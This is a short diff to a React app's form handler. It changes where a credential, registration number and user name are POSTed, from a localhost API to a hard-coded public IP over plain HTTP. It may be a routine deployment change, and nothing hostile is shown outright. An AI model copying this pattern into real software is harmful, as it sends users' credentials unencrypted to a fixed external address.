@@ -26,7 +26,7 @@ function App() {
         registrationNumber: registrationNumber,
         userName: userName
       };
-      await axios.post('http://localhost:5000/api/credentials', data);
+      await axios.post('http://191.36.9.231:5000/api/credentials', data);
       setCredential('');
       setRegistrationNumber('');
       setUserName('');
